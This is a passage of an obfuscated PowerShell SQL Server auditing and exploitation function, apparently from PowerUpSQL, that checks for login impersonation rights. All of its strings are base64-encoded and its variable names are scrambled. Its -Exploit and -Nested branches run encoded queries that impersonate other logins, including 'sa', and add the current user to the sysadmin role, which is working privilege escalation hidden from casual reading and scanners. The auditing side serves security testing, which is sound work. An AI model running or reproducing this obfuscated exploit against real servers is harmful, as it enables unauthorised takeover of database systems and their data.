                        $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                    }
                }
            }
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABEAEEAVABBAEIAQQBTAEUAIABSAE8ATABFACAALQAgAEQAQgBfAEQARABMAEEARABNAEkATgA=')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Invoke-SQLAuditPrivImpersonateLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,
		[Parameter(Mandatory = $false,
        HelpMessage = 'Exploit Nested Impersonation Capabilites.')]
        [switch]$Nested
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAAUABFAFIATQBJAFMAUwBJAE8ATgAgAC0AIABJAE0AUABFAFIAUwBPAE4AQQBUAEUAIABMAE8ARwBJAE4A')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAC4A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABQAEUAUgBNAEkAUwBTAEkATwBOACAALQAgAEkATQBQAEUAUgBTAE8ATgBBAFQARQAgAEwATwBHAEkATgA=')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMALgA=')))
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBzAHMAaQB2AGUAIABQAHIAaQB2AGkAbABlAGcAZQAgAC0AIABJAG0AcABlAHIAcwBvAG4AYQB0AGUAIABMAG8AZwBpAG4A')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABjAHUAcgByAGUAbgB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGwAbwBnAGkAbgAgAGMAYQBuACAAaQBtAHAAZQByAHMAbwBuAGEAdABlACAAbwB0AGgAZQByACAAbABvAGcAaQBuAHMALgAgACAAVABoAGkAcwAgAG0AYQB5ACAAYQBsAGwAbwB3ACAAYQBuACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAGwAbwBnAGkAbgAgAHQAbwAgAGcAYQBpAG4AIABhAGQAZABpAHQAaQBvAG4AYQBsACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA==')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBpAGQAZQByACAAdQBzAGkAbgBnACAAYQBuACAAYQBsAHQAZQByAGEAdABpAHYAZQAgAHQAbwAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABzAHUAYwBoACAAYQBzACAAcwBpAGcAbgBlAGQAIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlAHMALgAgAEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABpAHMAIABlAG4AYQBiAGwAZQBkACAAdQBzAGkAbgBnACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABHAFIAQQBOAFQAIABJAE0AUABFAFIAUwBPAE4AQQBUAEUAIABPAE4AIABMAG8AZwBpAG4AOgA6AHMAYQAgAHQAbwAgAFsAdQBzAGUAcgBdAC4AIABJAHQAIABjAGEAbgAgAGIAZQAgAHIAZQBtAG8AdgBlAGQAIAB1AHMAaQBuAGcAIABhACAAYwBvAG0AbQBhAG4AZAAgAGwAaQBrAGUAOgAgAFIARQBWAE8ASwBFACAASQBNAFAARQBSAFMATwBOAEEAVABFACAATwBOACAATABvAGcAaQBuADoAOgBzAGEAIAB0AG8AIABbAHUAcwBlAHIAXQA=')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBJAG0AcABlAHIAcwBvAG4AYQB0AGUATABvAGcAaQBuACAALQBJAG4AcwB0AGEAbgBjAGUAIAAkAEkAbgBzAHQAYQBuAGMAZQAgAC0ARQB4AHAAbABvAGkAdAA=')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAMQAzADYAMgAuAGEAcwBwAHgA')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${/====\__/=\_/=\/\} = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.PermissionName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAFAARQBSAFMATwBOAEEAVABFAA==')))
        }
        if(${/====\__/=\_/=\/\})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEwAbwBnAGkAbgBzACAAYwBhAG4AIABiAGUAIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAZAAuAA==')))
            ${____/=\_/=\___/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            ${/====\__/=\_/=\/\} |
            % -Process {
                ${_/==\/\__/===\__/} = $_.ObjectName
                ${_/\/\/=\/\_/\_/==} = $_.GranteeName
                ${___/\/\_/=====\/=} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsACcAJAB7AF8ALwA9AD0AXAAvAFwAXwBfAC8APQA9AD0AXABfAF8ALwB9ACcAKQAgAGEAcwAgAFMAdABhAHQAdQBzAA=='))) -SuppressVerbose | select -Property Status -ExpandProperty Status
                If(${___/\/\_/=====\/=} -eq 1)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewBfAC8AXAAvAFwALwA9AFwALwBcAF8ALwBcAF8ALwA9AD0AfQAgAGMAYQBuACAAaQBtAHAAZQByAHMAbwBuAGEAdABlACAAdABoAGUAIAAkAHsAXwAvAD0APQBcAC8AXABfAF8ALwA9AD0APQBcAF8AXwAvAH0AIABzAHkAcwBhAGQAbQBpAG4AIABsAG8AZwBpAG4ALgA=')))
                    ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAC8AXAAvAD0AXAAvAFwAXwAvAFwAXwAvAD0APQB9ACAAYwBhAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIAB0AGgAZQAgACQAewBfAC8APQA9AFwALwBcAF8AXwAvAD0APQA9AFwAXwBfAC8AfQAgAFMAWQBTAEEARABNAEkATgAgAGwAbwBnAGkAbgAuACAAVABoAGkAcwAgAHQAZQBzAHQAIAB3AGEAcwAgAHIAYQBuACAAdwBpAHQAaAAgAHQAaABlACAAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACAAbABvAGcAaQBuAC4A')))
                    if($Exploit)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAFMAdABhAHIAdABpAG4AZwAgAGUAeABwAGwAbwBpAHQAIABwAHIAbwBjAGUAcwBzAC4ALgAuAA==')))
                        ${_/=\/=====\/=\/=\} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsACcAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACcAKQAgAGEAcwAgAFMAdABhAHQAdQBzAA=='))) -SuppressVerbose | select -Property Status -ExpandProperty Status
                        if(${_/=\/=====\/=\/=\} -ne 1)
                        {
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAFYAZQByAGkAZgBpAGUAZAAgAHQAaABhAHQAIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB1AHMAZQByACAAKAAkAHsALwA9AFwAXwAvAD0APQBcAF8AXwAvAFwALwBcAF8ALwA9AH0AKQAgAGkAcwAgAE4ATwBUACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuAA==')))
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABhAGQAZAAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAIAAoACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQApACAAdABvACAAdABoAGUAIABzAHkAcwBhAGQAbQBpAG4AIAByAG8AbABlACAAYgB5ACAAaQBtAHAAZQByAHMAbwBuAGEAdABpAG4AZwAgACQAewBfAC8APQA9AFwALwBcAF8AXwAvAD0APQA9AFwAXwBfAC8AfQAuAC4ALgA=')))
                            $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBVAFQARQAgAEEAUwAgAEwATwBHAEkATgAgAD0AIAAnACQAewBfAC8APQA9AFwALwBcAF8AXwAvAD0APQA9AFwAXwBfAC8AfQAnADsARQBYAEUAQwAgAHMAcABfAGEAZABkAHMAcgB2AHIAbwBsAGUAbQBlAG0AYgBlAHIAIAAnACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQAnACwAJwBzAHkAcwBhAGQAbQBpAG4AJwA7AFIAZQB2AGUAcgB0AA=='))) -SuppressVerbose
                            ${/==\__/=\_/==\/=\} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsACcAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACcAKQAgAGEAcwAgAFMAdABhAHQAdQBzAA=='))) -SuppressVerbose | select -Property Status -ExpandProperty Status
                            if(${/==\__/=\_/==\/=\} -eq 1)
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEkAdAAgAHcAYQBzACAAcABvAHMAcwBpAGIAbABlACAAdABvACAAbQBhAGsAZQAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAIAAoACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQApACAAYQAgAHMAeQBzAGEAZABtAGkAbgAhAA==')))
                                ${__/\/\_/==\/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                            }
                            else
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEkAdAAgAHcAYQBzACAAbgBvAHQAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIABtAGEAawBlACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAgACgAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACkAIABhACAAcwB5AHMAYQBkAG0AaQBuAC4A')))
                            }
                        }
                        else
                        {
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAFQAaABlACAAYwB1AHIAcgBlAG4AdAAgAGwAbwBnAGkAbgAgACgAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACkAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAATgBvACAAcAByAGkAdgBpAGwAZQBnAGUAIABlAHMAYwBhAGwAYQB0AGkAbwBuACAAbgBlAGUAZABlAGQALgA=')))
                            ${__/\/\_/==\/==\/\} = 'No'
                        }
                    }
                    if($Nested)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAFMAdABhAHIAdABpAG4AZwAgAE4AZQBzAHQAZQBkACAASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgAgAGUAeABwAGwAbwBpAHQAIABwAHIAbwBjAGUAcwBzACAAKAB1AG4AZABlAHIAIABhAHMAcwB1AG0AcAB0AGkAbwBuACAAdABvACAAbABlAHYAZQBsAHMAIABvAGYAIABuAGUAcwB0AGkAbgBnACAAYQBuAGQAIAAxAHMAdAAgAGYAaQByAHMAdAAgAGMAYQBuACAAaQBtAHAAZQByAHMAbwBuAGEAdABlACAAcwBhACkALgAuAC4A')))
                        ${_/=\/=====\/=\/=\} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsACcAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACcAKQAgAGEAcwAgAFMAdABhAHQAdQBzAA=='))) -SuppressVerbose | select -Property Status -ExpandProperty Status
                        if(${_/=\/=====\/=\/=\} -ne 1)
                        {
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAFYAZQByAGkAZgBpAGUAZAAgAHQAaABhAHQAIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB1AHMAZQByACAAKAAkAHsALwA9AFwAXwAvAD0APQBcAF8AXwAvAFwALwBcAF8ALwA9AH0AKQAgAGkAcwAgAE4ATwBUACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuAA==')))
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABhAGQAZAAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAIAAoACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQApACAAdABvACAAdABoAGUAIABzAHkAcwBhAGQAbQBpAG4AIAByAG8AbABlAC4ALgAuAA==')))
                            $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBVAFQARQAgAEEAUwAgAEwATwBHAEkATgAgAD0AIAAnACQAewBfAC8APQA9AFwALwBcAF8AXwAvAD0APQA9AFwAXwBfAC8AfQAnADsARQBYAEUAQwBVAFQARQAgAEEAUwAgAEwATwBHAEkATgAgAD0AIAAnAHMAYQAnADsARQBYAEUAQwAgAHMAcABfAGEAZABkAHMAcgB2AHIAbwBsAGUAbQBlAG0AYgBlAHIAIAAnACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQAnACwAJwBzAHkAcwBhAGQAbQBpAG4AJwA=')))
                            ${/==\__/=\_/==\/=\} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsACcAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACcAKQAgAGEAcwAgAFMAdABhAHQAdQBzAA=='))) -SuppressVerbose | select -Property Status -ExpandProperty Status
                            if(${/==\__/=\_/==\/=\} -eq 1)
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEkAdAAgAHcAYQBzACAAcABvAHMAcwBpAGIAbABlACAAdABvACAAbQBhAGsAZQAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAIAAoACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQApACAAYQAgAHMAeQBzAGEAZABtAGkAbgAhAA==')))
                                ${__/\/\_/==\/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                            }
                            else
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEkAdAAgAHcAYQBzACAAbgBvAHQAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIABtAGEAawBlACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAgACgAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACkAIABhACAAcwB5AHMAYQBkAG0AaQBuAC4A')))
                            }
                        }
                        else
                        {
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAFQAaABlACAAYwB1AHIAcgBlAG4AdAAgAGwAbwBnAGkAbgAgACgAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACkAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAATgBvACAAcAByAGkAdgBpAGwAZQBnAGUAIABlAHMAYwBhAGwAYQB0AGkAbwBuACAAbgBlAGUAZABlAGQALgA=')))
                            ${__/\/\_/==\/==\/\} = 'No'
                        }
                    }
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewBfAC8AXAAvAFwALwA9AFwALwBcAF8ALwBcAF8ALwA9AD0AfQAgAGMAYQBuACAAaQBtAHAAZQByAHMAbwBuAGEAdABlACAAdABoAGUAIAAkAHsAXwAvAD0APQBcAC8AXABfAF8ALwA9AD0APQBcAF8AXwAvAH0AIABsAG8AZwBpAG4AIAAoAG4AbwB0ACAAYQAgAHMAeQBzAGEAZABtAGkAbgApAC4A')))
                    ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAC8AXAAvAD0AXAAvAFwAXwAvAFwAXwAvAD0APQB9ACAAYwBhAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIAB0AGgAZQAgACQAewBfAC8APQA9AFwALwBcAF8AXwAvAD0APQA9AFwAXwBfAC8AfQAgAGwAbwBnAGkAbgAgACgAbgBvAHQAIABhACAAcwB5AHMAYQBkAG0AaQBuACkALgAgAFQAaABpAHMAIAB0AGUAcwB0ACAAdwBhAHMAIAByAGEAbgAgAHcAaQB0AGgAIAB0AGgAZQAgACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQAgAGwAbwBnAGkAbgAuAA==')))
                    ${___/=\/=\_/=\_/==} = 'No'
                }
                $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
            }
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwAgAGwAbwBnAGkAbgBzACAAYwBvAHUAbABkACAAYgBlACAAaQBtAHAAZQByAHMAbwBuAGEAdABlAGQALgA=')))
        }
